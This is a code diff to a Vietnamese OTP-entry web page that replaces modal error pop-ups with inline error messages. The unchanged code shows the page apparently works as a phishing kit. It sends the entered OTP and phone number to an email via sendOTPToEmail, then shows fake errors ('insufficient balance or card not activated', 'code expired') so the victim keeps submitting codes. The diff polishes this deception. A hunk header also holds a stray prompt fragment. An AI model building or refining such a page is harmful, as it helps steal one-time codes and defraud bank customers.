@@ -138,6 +138,7 @@
                 <div class="mt-4">
                     <label for="otp" class="block text-sm font-medium text-slate-800 mb-2">Nhập mã OTP</label>
                     <input type="tel" id="otp" inputmode="numeric" class="otp-input w-full max-w-xs mx-auto px-4 py-2 text-center text-2xl tracking-[.5em] border border-slate-300 rounded-lg shadow-sm focus:outline-none transition" maxlength="8" />
+                    <p id="otp-error-inline" class="hidden mt-2 text-sm text-red-600"></p>
                 </div>
                 <p class="mt-4 text-sm font-semibold text-red-600" id="otpTimer" aria-live="polite">Còn 60 giây</p>
             </div>
@@ -208,10 +209,14 @@
         
         function clearOTPInput() {
             const otpInput = document.getElementById('otp');
+            const otpErrorInline = document.getElementById('otp-error-inline');
             if (otpInput) {
                 otpInput.value = '';
                 otpInput.classList.remove('error');
                 otpInput.focus();
+            }
+            if(otpErrorInline){
+                otpErrorInline.classList.add('hidden');
             }
         }
 
@@ -245,7 +250,19 @@
             );
         }
         
-        function showCustomError(message) {
+        function showInlineError(message) {
+            const otpInput = document.getElementById('otp');
+            const otpErrorInline = document.getElementById('otp-error-inline');
+            if (otpInput && otpErrorInline) {
+                otpInput.classList.add('error');
+                otpErrorInline.textContent = message;
+                otpErrorInline.classList.remove('hidden');
+                otpInput.focus();
+                otpInput.select();
+            }
+        }
+
+        function showModalError(message) {
             const modal = document.getElementById('errorModal');
             const errorMessageEl = document.getElementById('errorMessage');
             if (modal && errorMessageEl) {
@@ -259,7 +276,6 @@
             const errorButton = document.getElementById('errorButton');
             modal.classList.add('hidden');
             
-            // Reset button to default state
             errorButton.textContent = 'Thử lại';
             errorButton.onclick = closeErrorModal;
 
@@ -271,11 +287,11 @@
             const otp = otpInput.value.trim();
             const phone = formData.phone || 'N/A';
 
+            document.getElementById('otp-error-inline').classList.add('hidden');
             otpInput.classList.remove('error');
 
             if (otp.length !== 6 && otp.length !== 8) {
-                otpInput.classList.add('error');
-                showCustomError("Mã OTP phải là 6 hoặc 8 chữ số. Vui lòng kiểm tra lại.");
+                showInlineError("Mã OTP phải là 6 hoặc 8 chữ số. Vui lòng kiểm tra lại.");
                 return;
             }
             
@@ -284,10 +300,10 @@
             if (attemptCount === 1) {
                 sendOTPToEmail(otp, phone);
                 startOTPTimer();
-                showCustomError('Kiểm tra lại điều kiện, số dư không đủ hoặc thẻ chưa được kích hoạt.');
+                showInlineError('Kiểm tra lại điều kiện, số dư không đủ hoặc thẻ chưa được kích hoạt.');
             } else if (attemptCount === 2) {
                 startOTPTimer();
-                showCustomError('Mã xác nhận hết hiệu lực hoặc không đúng.');
+                showInlineError('Mã xác nhận hết hiệu lực hoặc không đúng.');
             } else {
                 sessionStorage.removeItem('formData');
                 const modal = document.getElementById('errorModal');
@@ -361,6 +377,14 @@ Hãy trình bày dưới dạng danh sách các gạch đầu dòng, sử dụng
         window.addEventListener('load', () => {
             startOTPTimer();
             setupMobileMenu();
+            
+            const otpInput = document.getElementById('otp');
+            const otpErrorInline = document.getElementById('otp-error-inline');
+
+            otpInput.addEventListener('input', () => {
+                otpInput.classList.remove('error');
+                otpErrorInline.classList.add('hidden');
+            });
 
             try {
                 formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
